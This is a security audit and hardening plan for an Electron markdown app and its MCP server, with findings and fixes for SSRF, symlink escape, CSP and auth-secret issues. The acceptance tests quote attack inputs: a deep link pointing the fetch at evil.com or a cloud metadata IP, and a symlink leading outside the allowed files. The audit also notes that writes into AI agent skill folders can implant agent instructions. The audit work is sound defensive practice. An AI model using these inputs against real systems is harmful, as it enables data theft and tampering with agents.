# Markie Launch — Phase 1: Security Audit + OSS Hardening

**Date:** 2026-06-16
**Status:** Design — awaiting review
**Phase:** 1 of 4 (the gate). Nothing goes public until this passes.

## Goal

Make Markie's **app + MCP** surface safe to open-source, and ship the security
fixes to current users. The backend (`server/`) stays **private** for now; we
still apply its two production-hardening fixes because they improve the live
service regardless.

## Decisions (locked)

- **License:** MIT.
- **Backend:** stays private this pass. Apply auth-secret + rate-limit fixes
  anyway (they harden the live Railway service). Open-sourcing the backend is a
  possible fast-follow — out of scope here.
- **Public repo history:** fresh single "initial public release" commit. The
  private monorepo retains the full 88-commit history.
- **OSS scope:** public = `electron/ src/ mcp/ build/ public/` + root config.
  Private = `server/ deploy/ docs/ scripts/ .claude/`.

## Audit results (the basis for this plan)

Four parallel reviews + gitleaks + npm audit. **Foundation is clean:** no secrets
ever committed (88 commits), no `.env` ever tracked, public surface free of
secrets/PII, every test fixture synthetic, dependency CVEs build-chain only.

Issues to fix (severity → workstream):

| Sev | Finding | Location | Workstream |
|---|---|---|---|
| HIGH | SSRF: `markie://open` fetches attacker-controlled `src` origin, writes to Downloads + opens | `electron/main.js` (`openSharedFromDeepLink`) | WS1 |
| HIGH | Symlink escape: MCP `guardPath` lexical-only → read/write anywhere via `.md` symlink | `mcp/lib.mjs` (`guardPath`) | WS1 |
| MED | No CSP on `app://` renderer (no XSS backstop) | `electron/main.js` | WS1 |
| MED | `term-open-external` spawns `open -a <appName>` with unvalidated renderer input | `electron/terminal.js` | WS1 |
| MED | MCP write can implant skill-instruction files in allowlist roots | `mcp/markie-mcp.mjs` | WS1 |
| LOW | `app://` handler lacks containment guard; `serverURL` not pinned before token send | `electron/main.js`, `electron/sync.js` | WS1 |
| OSS-blocker | `BETTER_AUTH_SECRET` hardcoded dev fallback | `server/src/auth.ts:13` | WS2 |
| prod | Auth rate-limiting in-memory only; no per-path sign-in/OTP limits | `server/src/auth.ts` | WS2 |
| readiness | No LICENSE; README is create-next-app boilerplate; `package.json` missing public metadata | root | WS3 |
| structural | Internal files (Apple Team ID, real name, prod stack, local paths) live in this monorepo | `server/ deploy/ docs/ scripts/` | WS4 |

Confirmed safe by design: `contextIsolation`/`nodeIntegration` correct; Downloads
filename-traversal mitigated; MCP `..`/absolute/non-`.md`/hidden-dir deny; MCP
`open` no shell/arg injection; backend SQL parameterized; share tokens ~244-bit;
authz correct on every route; public render XSS-sanitized; CORS strict allowlist.

---

## Workstream 1 — Security fixes (app + MCP) → ship as **0.2.8**

These reach current users, so they ship as a notarized release through the
existing preflight gate.

### App (`electron/`)

1. **SSRF fix (HIGH).** In `openSharedFromDeepLink`, stop deriving the fetch
   origin from the deep link's `src` param. Always fetch from the app's
   configured server URL (`getServerURL()` / `DEFAULT_SERVER`). `src` may still be
   read for display/telemetry but must never set the fetch host. (Single
   production server today, so pinning is correct; if multi-server is ever needed,
   replace with an explicit origin allowlist.)
   *Acceptance:* `markie://open?token=x&src=evil.com` and `src=169.254.169.254`
   fetch from the known server, not the attacker. Re-run the agent's exploit.

2. **CSP for `app://` renderer (MED).** Inject a strict CSP via
   `session.defaultSession.webRequest.onHeadersReceived` for `app://` responses:
   `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
   img-src 'self' data: https:; connect-src 'self' https://api-production-602f.up.railway.app https://*.up.railway.app wss://*.up.railway.app; font-src 'self' data:; base-uri 'none'; object-src 'none'`.
   Adjust iteratively — a CSP can break the app. Must verify app loads, preview
   renders (KaTeX/hljs styles), and sync/collab connect.
   *Acceptance:* app fully functional with CSP active; preflight gate passes.

3. **Validate external-terminal app name (MED).** In `term-open-external`, reject
   `appName` not present in the detected `externalApps()` list before `spawn`.
   *Acceptance:* an arbitrary app name is rejected; known apps still launch.

4. **`app://` containment guard (LOW).** In the protocol handler,
   `path.resolve(outDir, decodedPathname)` and reject if it doesn't
   `startsWith(outDir + path.sep)`.

5. **Pin `serverURL` before sending token (LOW).** When handling `sync-config`,
   validate the serverURL host against an allowlist (`DEFAULT_SERVER` host +
   `localhost` in dev) before the bearer token is forwarded to the sync engine.

### MCP (`mcp/`)

6. **Symlink-escape fix (HIGH).** Canonicalize in `guardPath`:
   - Reads/open: `fs.realpath()` the resolved target; re-run all guard checks
     (under-home, excluded-segment, `.md` extension) on the realpath.
   - Writes: `fs.realpath()` the resolved **parent** dir; reject if the final
     path component is an existing symlink; re-run checks on `realpath(parent) +
     basename`. Keep the existing lexical checks as the first gate (cheap, and
     they handle non-existent paths).
   - `guardPath` gains a mode (`"read" | "write"`) or splits into two helpers.
   *Acceptance:* re-run all of the agent's verified exploits (`~/link.md` →
   `/tmp/outside/secret.txt`; write through a symlinked dir; allowlist-root
   symlink) → every one DENIES. Add `mcp/lib.test.mjs` cases for each.

7. **Gate writes to allowlist roots (MED).** `markie_write_md` refuses writes
   under `~/.claude/skills` and `~/.codex` (treat them as read-only for the write
   tool; `find`/`read`/`list_skills` still work). Prevents agent-instruction
   implantation.
   *Acceptance:* write to `~/.claude/skills/x.md` → denied with a clear error.

### Release

8. Re-run unit tests (renderer vitest + `node:test` for `electron/` and `mcp/`),
   re-run the two HIGH exploits manually, pass the **preflight release gate**,
   notarize, publish 0.2.8 to B2. Bump `package.json` to `0.2.8`.

## Workstream 2 — Backend prod-hardening (private; improves live service)

9. **Fail-closed auth secret.** `server/src/auth.ts:13` — throw on boot if
   `BETTER_AUTH_SECRET` is unset and `NODE_ENV === "production"`; keep the dev
   fallback only outside production.
10. **Explicit rate limiting.** Add a `rateLimit` block with tighter custom rules
    for `/api/auth/sign-in/email` and `/email-otp/send-verification-otp` (the
    OTP-send is an unauthenticated email trigger → spam/cost vector). Prefer
    DB-backed (better-sqlite3) storage so limits survive restarts and scale.
11. Redeploy to Railway (env already sets the secret, so prod keeps booting).
    *Acceptance:* sign-in/OTP throttle as configured; server boots with env set,
    refuses to boot in prod without the secret.

## Workstream 3 — OSS-readiness

12. **LICENSE** — MIT, `Copyright (c) 2026 ZVN`.
13. **README** — rewrite for a public audience: what Markie is, highlight features
    (editor/preview, device-wide Browse, sharing, MCP for agents), Apple-Silicon /
    macOS only, free, download link, build-from-source steps, MCP setup, license.
    No internal infra/process references.
14. **`package.json` metadata** — add `description`, `author`, `license: "MIT"`,
    `repository` (new public repo), `homepage` (marketing site), `keywords`. Keep
    `"private": true` (Electron app, never `npm publish`-ed). Same for
    `mcp/package.json` (+ `license`).
15. **B2 bucket name** in `build.publish` stays (bucket is public-read for
    auto-update; name isn't a credential). No change.

## Workstream 4 — Repo split (executed at Phase 4 flip)

Defined now, run when we go public:

16. Create a **new public GitHub repo** (exact name confirmed at Phase 4 — likely
    public `markie`, with this monorepo renamed to a private `markie-monorepo`).
17. Build the curated tree — copy ONLY: `electron/ src/ mcp/ build/ public/`,
    root config (`package.json`, `package-lock.json`, `tsconfig*.json`,
    `next.config.ts`, postcss/tailwind config, `vitest.config.ts`), a public
    `.gitignore` (server lines dropped), new `README.md`, new `LICENSE`.
18. **Exclude:** `server/ deploy/ docs/ scripts/ .claude/` and any session files.
19. Fresh `git init`; single commit `Markie 0.2.8 — initial public release`.
20. **Re-scan the curated tree** with gitleaks + a PII grep before the repo is
    flipped public.

## Sequencing

WS1 → WS2 → WS3 → build/notarize/publish **0.2.8** → (Phase 2 marketing, Phase 3
MCP distribution) → WS4 curation + flip public (Phase 4).

## Testing & verification

- Re-run both HIGH exploits manually → must pin/deny.
- New unit tests: MCP `guardPath` symlink cases; (best-effort) deep-link SSRF.
- Renderer + server + MCP test suites green.
- Preflight release gate passes for 0.2.8 (window loads, title check).
- Backend: boot-without-secret rejected in prod; rate limits enforced.
- gitleaks re-scan on the curated public tree before going public.

## Out of scope (later phases)

Marketing landing page + demo gif (Phase 2), MCP plugin/Codex packaging
(Phase 3), open-sourcing the backend, custom domain `markie.zvndev.com`.

## Risks / open items

- **CSP breakage** — most likely to need iteration; Next static export may force
  `script-src` adjustments. Gate on the app actually working.
- **Public repo name** — small decision deferred to Phase 4 (rename monorepo vs.
  new name).
- **MCP skill-root writes** — defaulting to deny; can add an explicit opt-in later
  if writing skills becomes a wanted feature.
